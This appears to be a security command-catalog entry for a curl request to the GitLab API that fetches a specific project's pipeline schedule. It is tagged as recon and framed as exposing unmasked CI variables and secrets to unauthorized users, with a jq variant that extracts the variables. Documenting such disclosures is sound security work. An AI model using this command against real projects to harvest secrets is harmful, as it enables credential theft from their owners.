---
id: cmd-curl-gitlab-fetch-001
name: curl-gitlab-pipeline-schedule-fetch
type: command
executor: bash
data: >-
  curl --header "Private-Token: <your_access_token>"
  https://gitlab.com/api/v4/projects/20618145/pipeline_schedules/69918
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.678Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api
  - gitlab
  - recon
verified: false
validated: true
submitted: true
---

# curl-gitlab-pipeline-schedule-fetch

## Command

```bash
curl --header "Private-Token: <your_access_token>" https://gitlab.com/api/v4/projects/20618145/pipeline_schedules/69918
```

## Description

This command retrieves details of a specific GitLab pipeline schedule via the API, including custom variables, using a personal access token for authentication. It demonstrates information disclosure by exposing sensitive data to unauthorized users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "Private-Token: <your_access_token>"` | Authentication header with GitLab personal access token | Yes |
| URL path `projects/20618145/pipeline_schedules/69918` | Specifies project ID and schedule ID in the API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl --header "Private-Token: glpat-abc123" https://gitlab.com/api/v4/projects/20618145/pipeline_schedules/69918
```

### Advanced Usage

```bash
curl --header "Private-Token: <your_access_token>" -s https://gitlab.com/api/v4/projects/20618145/pipeline_schedules/69918 | jq '.variables'
```

## Expected Output

JSON response with schedule details, e.g., {"id":69918,"variables":[{"key":"VAR1","value":"secretvalue"}],...}, showing unmasked sensitive values.

## Related

- [[Related Procedure: Exploit-GitLab-Pipeline-API-for-Variable-Disclosure]]
